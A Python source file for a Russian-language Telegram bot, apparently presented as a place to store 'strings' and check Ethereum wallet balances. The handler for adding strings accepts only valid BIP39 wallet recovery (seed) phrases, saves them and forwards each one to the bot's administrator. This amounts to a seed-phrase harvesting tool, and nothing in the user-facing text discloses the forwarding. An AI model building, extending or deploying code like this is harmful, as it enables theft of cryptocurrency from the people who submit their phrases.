from aiogram import types
from aiogram.dispatcher import FSMContext

from data.config import ETHSCAN_API_KEY, ADMIN_ID
from keyboards.base_reply import base_reply_keyboard
from keyboards.start_rules_inline import create_rules_keyboard
from loader import dp, bot
from utils.misc.bip39_validator import async_validate_bip39
from utils.misc.ethscan import async_check_eth_balance
from utils.misc.json_worker import validate_user, add_user_phrase, get_user_phrases
from aiogram.dispatcher.filters.state import State, StatesGroup
from bip39 import bip39_validate

class FSM(StatesGroup):
    address = State()
    phrases = State()


@dp.message_handler()
async def check_msg(message: types.Message):
    if await validate_user(str(message.from_user.id)) is True:

        if message.text == "Мои строки":
            user_phrases = await get_user_phrases(str(message.from_id))
            if len(user_phrases) > 0:
                await message.reply('\n\n'.join(user_phrases), reply_markup=base_reply_keyboard())
            else:
                await message.reply('У вас нет добавленных строк.', reply_markup=base_reply_keyboard())

        elif message.text == "Проверить баланс":
            await message.reply("Введите адрес ETH кошелька")
            await FSM.address.set()

        elif message.text == "Добавить строку":
            await message.reply('Введите строку, либо загрузите пачкой в формате: \nСтрока\nСтрока\nИ т.д.')
            await FSM.phrases.set()

        else:
            await message.answer("Такого действия не существует.", reply_markup=base_reply_keyboard())

    else:
        await message.reply("Чтобы начать работу, согласитесь с правилами: (rules)",
                            reply_markup=create_rules_keyboard())


@dp.message_handler(state=FSM.address)
async def get_balance_address(message: types.Message, state=FSMContext):
    try:
        BALANCE = await async_check_eth_balance(message.text, ETHSCAN_API_KEY)
        await message.reply(BALANCE + " ETH",
                            reply_markup=base_reply_keyboard())
    except ValueError:
        await message.reply("Такого кошелька не существует.",
                            reply_markup=base_reply_keyboard())

    await state.finish()


@dp.message_handler(state=FSM.phrases)
async def get_phrases(message: types.Message, state=FSMContext):
    phrases = message.text.split('\n')
    user_id = str(message.from_id)
    valid_phrases = []
    for phrase in phrases:
        if (bip39_validate(phrase) is True) and (phrase not in await get_user_phrases(user_id)):
            await add_user_phrase(user_id, phrase)
            valid_phrases.append(phrase)
    await message.reply("Успешно добавленные строки:\n" + "\n".join(valid_phrases),
                        reply_markup=base_reply_keyboard())

    if len(valid_phrases) > 0:
        await bot.send_message(ADMIN_ID, f"Пользователь {user_id} загрузил строки: {valid_phrases}")

    await state.finish()
